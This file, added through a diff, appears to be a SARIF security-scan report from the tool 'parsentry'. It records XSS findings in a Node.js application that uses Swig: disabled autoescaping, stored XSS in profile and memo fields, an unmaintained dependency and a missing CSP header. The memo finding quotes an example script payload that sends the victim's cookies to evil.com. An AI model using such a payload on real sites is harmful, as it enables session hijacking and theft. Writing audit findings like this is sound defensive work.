@@ -1,0 +1,227 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "parsentry",
+          "version": "0.1.0",
+          "informationUri": "https://github.com/HikaruEgashira/parsentry",
+          "rules": [
+            {
+              "id": "XSS-AUTOESCAPE-DISABLED",
+              "name": "AutoescapeDisabled",
+              "shortDescription": {
+                "text": "Swig template engine autoescape globally disabled"
+              },
+              "fullDescription": {
+                "text": "swig.setDefaults({ autoescape: false }) disables HTML escaping for all template output. Every dynamic variable rendered in any Swig template becomes an XSS vector. Any user-controlled data (profile fields, memo content, query parameters) injected into templates will be rendered as raw HTML, allowing arbitrary script execution in victims' browsers."
+              },
+              "helpUri": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+              "properties": {
+                "tags": [
+                  "security",
+                  "xss",
+                  "CWE-79",
+                  "A03:2021"
+                ]
+              }
+            },
+            {
+              "id": "XSS-PROFILE-FIELDS",
+              "name": "StoredXSSViaProfileFields",
+              "shortDescription": {
+                "text": "Stored XSS through unescaped profile fields"
+              },
+              "fullDescription": {
+                "text": "User profile fields (firstName, lastName, website, etc.) are stored in the database and rendered in templates without escaping. An attacker can inject malicious scripts into profile fields that execute when any user views the profile. This is a stored/persistent XSS vulnerability with broad impact since profiles are viewed by other users."
+              },
+              "helpUri": "https://owasp.org/www-community/attacks/xss/#stored-xss-attacks",
+              "properties": {
+                "tags": [
+                  "security",
+                  "xss",
+                  "stored-xss",
+                  "CWE-79",
+                  "A03:2021"
+                ]
+              }
+            },
+            {
+              "id": "XSS-MEMO-CONTENT",
+              "name": "StoredXSSViaMemoContent",
+              "shortDescription": {
+                "text": "Stored XSS through unescaped memo/note content"
+              },
+              "fullDescription": {
+                "text": "Memo content submitted by users is rendered in templates without HTML escaping. An attacker can store a memo containing JavaScript payloads that execute when the memo is viewed. Combined with the disabled autoescape, this provides a reliable stored XSS vector."
+              },
+              "helpUri": "https://owasp.org/www-community/attacks/xss/#stored-xss-attacks",
+              "properties": {
+                "tags": [
+                  "security",
+                  "xss",
+                  "stored-xss",
+                  "CWE-79",
+                  "A03:2021"
+                ]
+              }
+            },
+            {
+              "id": "UNMAINTAINED-DEPENDENCY",
+              "name": "UnmaintainedSwigDependency",
+              "shortDescription": {
+                "text": "Swig 1.4.2 is unmaintained and deprecated since 2016"
+              },
+              "fullDescription": {
+                "text": "The application uses Swig 1.4.2 as its template engine. Swig has been unmaintained and deprecated since 2016. It has known security issues including XSS bypasses that will never be patched. Using unmaintained dependencies with known vulnerabilities violates secure supply chain practices."
+              },
+              "helpUri": "https://owasp.org/www-project-dependency-check/",
+              "properties": {
+                "tags": [
+                  "security",
+                  "supply-chain",
+                  "CWE-1104",
+                  "A06:2021"
+                ]
+              }
+            },
+            {
+              "id": "MISSING-CSP-HEADER",
+              "name": "MissingContentSecurityPolicy",
+              "shortDescription": {
+                "text": "No Content-Security-Policy header to mitigate XSS"
+              },
+              "fullDescription": {
+                "text": "The application does not set Content-Security-Policy (CSP) headers. CSP provides defense-in-depth against XSS attacks by restricting which scripts can execute. Without CSP, successful XSS exploitation has no browser-level mitigation, allowing unrestricted script execution, data exfiltration, and session hijacking."
+              },
+              "helpUri": "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html",
+              "properties": {
+                "tags": [
+                  "security",
+                  "headers",
+                  "defense-in-depth",
+                  "CWE-1021",
+                  "A05:2021"
+                ]
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "XSS-AUTOESCAPE-DISABLED",
+          "level": "error",
+          "message": {
+            "text": "swig.setDefaults({ autoescape: false }) disables HTML escaping globally. All template variables are rendered as raw HTML, making every dynamic output an XSS vector. This is the root cause enabling all template-based XSS in the application."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "XSS-PROFILE-FIELDS",
+          "level": "error",
+          "message": {
+            "text": "User profile fields (firstName, lastName, website) from the database are rendered in view templates without escaping. An attacker stores malicious JavaScript in profile fields that executes when any user views the profile page, achieving stored XSS."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/profile.html"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "XSS-MEMO-CONTENT",
+          "level": "error",
+          "message": {
+            "text": "Memo content submitted by users is rendered in templates without HTML escaping. An attacker submits a memo containing a script payload (e.g., <script>document.location='http://evil.com/?c='+document.cookie</script>) that executes when the memo is displayed."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/memos.html"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "UNMAINTAINED-DEPENDENCY",
+          "level": "warning",
+          "message": {
+            "text": "Swig 1.4.2 has been deprecated and unmaintained since 2016. Known XSS bypass vulnerabilities exist and will never receive patches. The project should migrate to a maintained template engine (e.g., Nunjucks, EJS with auto-escaping, Handlebars)."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "package.json"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.95
+          }
+        },
+        {
+          "ruleId": "MISSING-CSP-HEADER",
+          "level": "warning",
+          "message": {
+            "text": "No Content-Security-Policy header is configured. Without CSP, the browser places no restrictions on inline scripts or external script sources, maximizing the impact of any XSS vulnerability. At minimum, set script-src to disallow inline scripts and restrict sources."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "server.js"
+                },
+                "region": {
+                  "startLine": 1
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.95
+          }
+        }
+      ]
+    }
+  ]
+}
